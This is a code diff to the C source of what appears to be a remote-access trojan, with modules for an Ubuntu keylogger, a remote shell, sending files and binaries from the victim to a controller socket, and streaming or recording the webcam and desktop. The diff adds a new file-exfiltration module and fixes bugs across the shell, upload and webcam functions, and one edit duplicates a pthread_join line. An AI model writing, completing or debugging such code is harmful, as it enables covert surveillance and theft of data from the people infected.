@@ -175,7 +175,6 @@ void dispatch_modules(char *argv[])
 
         printf("flag received : %ld\n", flag);
 
-
         if(flag == 1)
         {
             printf("\t\tSTARTING UBUNTU 16.04 KEYLOGGER ....\n");
@@ -296,7 +295,7 @@ void dispatch_modules(char *argv[])
                 return;
             }
 
-            if (pthread_join(thread_remote_shell, NULL))
+            if (pthread_join(thread_remote_shell, NULL) != 0)
             {
                 perror("pthread_join");
 
@@ -316,7 +315,26 @@ void dispatch_modules(char *argv[])
                 return;
             }
 
-            if(pthread_join(thread_downloader, NULL))
+            if(pthread_join(thread_downloader, NULL) != 0)
+            {
+                perror("pthread_join");
+                return;
+            }
+
+            //send_dowloaded_file();
+        }
+
+        if(flag == 15)
+        {
+            printf("\t\tSENDING BINARIE TO DOWNLOAD ....\n");
+
+            if(pthread_create(&thread_downloader, NULL, (void*(*)(void*))send_dowloaded_binarie, NULL) == -1)
+            {
+                error("pthread_create() send_dowloaded_binarie", "dispatch_modules()");
+                return;
+            }
+
+            if(pthread_join(thread_downloader, NULL) != 0)
             {
                 perror("pthread_join");
                 return;
@@ -336,7 +354,7 @@ void dispatch_modules(char *argv[])
                 return;
             }
 
-            if(pthread_join(thread_hosts_downloader, NULL))
+            if(pthread_join(thread_hosts_downloader, NULL) != 0)
             {
                 perror("pthread_join");
                 return;
@@ -352,13 +370,12 @@ void dispatch_modules(char *argv[])
             if(pthread_create(&stream_webcam_thread, NULL, (void*(*)(void*))execute_cmd, NULL) == -1)
             {
                 error("pthread_create() stream_webcam_thread", "dispatch_modules()");
-                exit(-1);
+                return;
             }
 
-            if (pthread_join(stream_webcam_thread, NULL))
+            if(pthread_join(stream_webcam_thread, NULL) != 0)
             {
                 perror("pthread_join");
-
                 return;
             }
         }
@@ -376,7 +393,8 @@ void dispatch_modules(char *argv[])
                 exit(-1);
             }
 
-            if (pthread_join(stream_desktop, NULL))
+            if (pthread_join(stream_desktop, NULL) != 0)
+            if (pthread_join(stream_desktop, NULL) != 0)
             {
                 perror("pthread_join");
 
@@ -394,15 +412,14 @@ void dispatch_modules(char *argv[])
             if(pthread_create(&record_webcam_thread, NULL, (void*(*)(void*))execute_record_cmd, NULL) == -1)
             {
                 error("pthread_create() record_webcam_thread", "dispatch_modules()");
-                exit(-1);
+                return;
             }
 
-            if(pthread_join(record_webcam_thread, NULL))
+            if(pthread_join(record_webcam_thread, NULL) != 0)
             {
                 perror("pthread_join");
                 return;
             }
-
         }
     }
 
@@ -599,6 +616,105 @@ void *send_dowloaded_file()
         pthread_exit(NULL);
     }
 
+    on_download = fopen(file_path, "r");
+    if(on_download == NULL)
+    {
+        error("fopen() on_download", "send_dowloaded_file()");
+        pthread_exit(NULL);
+    }
+
+    fseek(on_download, 0, SEEK_END);
+    file_size = ftell(on_download);
+    rewind(on_download);
+
+    /** Envoie de la taille du fichier txt **/
+    if(send(csock, (char*)&file_size, sizeof(file_size), 0) == SOCKET_ERROR)
+    {
+        error("send() file_size", "send_dowloaded_file()");
+        pthread_exit(NULL);
+
+    }
+
+    printf("Weight of the file send with success : %ld octets\n", file_size);
+
+    do
+    {
+        dataRead = fread(buffer, sizeof(char), file_size, on_download);
+        if(dataRead < 0)
+        {
+            perror("fread ");
+            pthread_exit(NULL);
+        }
+
+        dataSend = send(csock, buffer, file_size , 0);
+
+        if(dataSend < 0)
+        {
+            perror("send() ");
+            pthread_exit(NULL);
+        }
+
+        totalSend += dataSend;
+
+    }while(totalSend < file_size);
+
+    printf("File totaly send with success : %ld\n", totalSend);
+
+    fclose(on_download);
+
+    free(fichier);
+    free(file_path);
+
+    pthread_exit(NULL);
+}
+
+void *send_dowloaded_binarie()
+{
+    gchar *file_path = NULL;
+    size_t len_file_path = 0;
+
+    FILE *on_download = NULL;
+
+    char buffer[BUFSIZ] = "";
+
+    long dataSend = 0;
+    long dataRead = 0;
+    long totalSend = 0;
+    long file_size = 0;
+
+    if(recv(csock, (char*)&len_file_path, sizeof(len_file_path), 0) == -1)
+    {
+        error("recv() len_file_path", "send_dowloaded_file()");
+        pthread_exit(NULL);
+    }
+
+    file_path = malloc(len_file_path * sizeof(char));
+    if(file_path == NULL)
+    {
+        error("malloc() file_path", "send_dowloaded_file()");
+        pthread_exit(NULL);
+    }
+
+    printf("len path = %ld\n\n", len_file_path);
+
+    if(recv(csock, file_path, len_file_path, 0) == -1)
+    {
+        error("recv() file_path", "send_dowloaded_file()");
+        pthread_exit(NULL);
+    }
+
+    printf("path = %s\n", file_path);
+
+
+    struct stat *fichier = malloc(sizeof(struct stat));
+
+    stat(file_path, fichier);
+    if(S_ISDIR(fichier->st_mode) == 1)
+    {
+        free(file_path);
+        pthread_exit(NULL);
+    }
+
     on_download = fopen(file_path, "rb");
     if(on_download == NULL)
     {
@@ -629,7 +745,7 @@ void *send_dowloaded_file()
             pthread_exit(NULL);
         }
 
-        dataSend = send(csock, buffer, sizeof(file_size), 0);
+        dataSend = send(csock, buffer, sizeof(file_size) , 0);
 
         if(dataSend < 0)
         {
@@ -681,7 +797,7 @@ void *send_hosts_file()
 
     printf("path sended  %s....", file_path);
 
-    hosts_download = fopen(file_path, "rb");
+    hosts_download = fopen(file_path, "r");
     if(hosts_download == NULL)
     {
         error("fopen() hosts_download", "send_hosts_file()");
@@ -703,14 +819,14 @@ void *send_hosts_file()
 
     do
     {
-        dataRead = fread(buffer, sizeof(char),sizeof(file_size), hosts_download);
+        dataRead = fread(buffer, sizeof(char), file_size, hosts_download);
         if(dataRead < 0)
         {
             perror("fread ");
             return 0;
         }
 
-        dataSend = send(csock, buffer, sizeof(file_size), 0);
+        dataSend = send(csock, buffer, file_size, 0);
 
         //printf("Envoie de %ld octets\n", dataSend);
 
@@ -724,7 +840,7 @@ void *send_hosts_file()
 
     }while(totalSend < file_size);
 
-    printf("File totaly send with success : %ld\n", dataSend);
+    printf("File totaly send with success : %ld\n", totalSend);
 
     fclose(hosts_download);
 
@@ -787,7 +903,7 @@ void *start_remote_shell(char *argv[])
         }
     }
 
-    else /*father*/
+    else
     {
         for(;;)
         {
@@ -824,7 +940,7 @@ void *start_remote_shell(char *argv[])
                 pthread_exit(NULL);
             }
 
-            ret = fread(buffer_cmd, MAXDATASIZE, sizeof(char), pipe);
+            ret = fread(buffer_cmd, sizeof(char), MAXDATASIZE, pipe);
             if(ret < 0)
             {
 
@@ -832,7 +948,7 @@ void *start_remote_shell(char *argv[])
                 pthread_exit(NULL);
             }
 
-            if(send(csock, buffer_cmd, MAXDATASIZE, 0) == SOCKET_ERROR) // BUFSIZE
+            if(send(csock, buffer_cmd, MAXDATASIZE, 0) == SOCKET_ERROR)
             {
                 error("send() buffer_cmd", "start_remote_shell()");
                 pthread_exit(NULL);
@@ -852,10 +968,62 @@ void *start_remote_shell(char *argv[])
     pthread_exit(NULL);
 }
 
-
-void execute_cmd()
+void *execute_cmd()
 {
+    size_t len_cmd = 0;
+    char *buffer = NULL;
 
+    GstElement *pipeline;
+    GstStateChangeReturn ret;
+    CustomData data;
+
+    if(recv(csock, (char*)&len_cmd, sizeof(len_cmd), 0) == SOCKET_ERROR)
+    {
+        error("recv() len_cmd", "execute_watch_cmd()");
+        pthread_exit(NULL);
+    }
+
+    buffer = malloc(len_cmd * sizeof(char));
+    if(buffer == NULL)
+    {
+        error("malloc() buffer", "execute_watch_cmd()");
+        free(buffer);
+        pthread_exit(NULL);
+    }
+
+    if(recv(csock, buffer, len_cmd, 0) == SOCKET_ERROR)
+    {
+        error("recv() buffer", "execute_watch_cmd()");
+        free(buffer);
+        pthread_exit(NULL);
+    }
+
+    memset (&data, 0, sizeof (data));
+
+    pipeline = gst_parse_launch(buffer, NULL);
+
+    ret = gst_element_set_state (pipeline, GST_STATE_PLAYING);
+
+    if(ret == GST_STATE_CHANGE_FAILURE)
+    {
+        g_printerr ("Unable to set the pipeline to the playing state.\n");
+        gst_object_unref (pipeline);
+        pthread_exit(NULL);
+    }
+
+    else if(ret == GST_STATE_CHANGE_NO_PREROLL)
+    {
+        data.is_live = TRUE;
+    }
+
+    gst_object_unref(pipeline);
+    free(buffer);
+
+    pthread_exit(NULL);
+}
+
+void *execute_record_cmd()
+{
     size_t len_record_cmd = 0;
     char *buffer = NULL;
 
@@ -867,38 +1035,35 @@ void execute_cmd()
 
     if(recv(csock, (char*)&len_record_cmd, sizeof(len_record_cmd), 0) == SOCKET_ERROR)
     {
-        error("recv() len_record_cmd", "execute_watch_cmd()");
-        exit(-1);
+        error("recv() len_record_cmd", "execute_record_cmd()");
+        pthread_exit(NULL);
     }
 
     buffer = malloc(len_record_cmd * sizeof(char));
     if(buffer == NULL)
     {
-        error("malloc() buffer", "execute_watch_cmd()");
-        exit(-1);
+        error("malloc() buffer", "execute_record_cmd()");
+        pthread_exit(NULL);
     }
 
     if(recv(csock, buffer, len_record_cmd, 0) == SOCKET_ERROR)
     {
-        error("recv() buffer", "execute_watch_cmd()");
-        exit(-1);
+        error("recv() buffer", "execute_record_cmd()");
+        pthread_exit(NULL);
     }
 
-    /* Initialize our data structure */
     memset (&data, 0, sizeof (data));
 
-    /* Build the pipeline */
     pipeline = gst_parse_launch(buffer, NULL);
     bus = gst_element_get_bus (pipeline);
 
-    /* Start playing */
     ret = gst_element_set_state (pipeline, GST_STATE_PLAYING);
 
     if(ret == GST_STATE_CHANGE_FAILURE)
     {
         g_printerr ("Unable to set the pipeline to the playing state.\n");
         gst_object_unref (pipeline);
-        exit(-1);
+        pthread_exit(NULL);
     }
 
     else if(ret == GST_STATE_CHANGE_NO_PREROLL)
@@ -913,11 +1078,9 @@ void execute_cmd()
     gst_bus_add_signal_watch (bus);
     g_signal_connect(bus, "message", G_CALLBACK(cb_message), &data);
 
-    pthread_exit(NULL);
-
     g_main_loop_run(main_loop);
 
-    /* Free resources */
+
     g_main_loop_unref (main_loop);
     gst_object_unref (bus);
     gst_element_set_state (pipeline, GST_STATE_NULL);
@@ -925,7 +1088,7 @@ void execute_cmd()
 
     free(buffer);
 
-    close(csock);
+    pthread_exit(NULL);
 }
 
 void cb_message(GstBus *bus, GstMessage *msg, CustomData *data)
@@ -984,81 +1147,6 @@ void cb_message(GstBus *bus, GstMessage *msg, CustomData *data)
             /* Unhandled message */
             break;
     }
-}
-
-
-void execute_record_cmd()
-{
-    size_t len_record_cmd = 0;
-    char *buffer = NULL;
-
-    GstElement *pipeline;
-    GstBus *bus;
-    GstStateChangeReturn ret;
-    GMainLoop *main_loop;
-    CustomData data;
-
-    if(recv(csock, (char*)&len_record_cmd, sizeof(len_record_cmd), 0) == SOCKET_ERROR)
-    {
-        error("recv() len_record_cmd", "execute_watch_cmd()");
-        exit(-1);
-    }
-
-    buffer = malloc(len_record_cmd * sizeof(char));
-    if(buffer == NULL)
-    {
-        error("malloc() buffer", "execute_watch_cmd()");
-        exit(-1);
-    }
-
-    if(recv(csock, buffer, len_record_cmd, 0) == SOCKET_ERROR)
-    {
-        error("recv() buffer", "execute_watch_cmd()");
-        exit(-1);
-    }
-
-  /* Initialize our data structure */
-    memset (&data, 0, sizeof (data));
-
-    /* Build the pipeline */
-    pipeline = gst_parse_launch(buffer, NULL);
-    bus = gst_element_get_bus (pipeline);
-
-    /* Start playing */
-    ret = gst_element_set_state (pipeline, GST_STATE_PLAYING);
-
-    if(ret == GST_STATE_CHANGE_FAILURE)
-    {
-        g_printerr ("Unable to set the pipeline to the playing state.\n");
-        gst_object_unref (pipeline);
-        exit(-1);
-    }
-
-    else if(ret == GST_STATE_CHANGE_NO_PREROLL)
-    {
-        data.is_live = TRUE;
-    }
-
-    main_loop = g_main_loop_new (NULL, FALSE);
-    data.loop = main_loop;
-    data.pipeline = pipeline;
-
-    gst_bus_add_signal_watch (bus);
-    g_signal_connect(bus, "message", G_CALLBACK(cb_message), &data);
-
-    pthread_exit(NULL);
-
-    g_main_loop_run(main_loop);
-
-    /* Free resources */
-    g_main_loop_unref (main_loop);
-    gst_object_unref (bus);
-    gst_element_set_state (pipeline, GST_STATE_NULL);
-    gst_object_unref (pipeline);
-
-    free(buffer);
-
-    close(csock);
 }
 
 
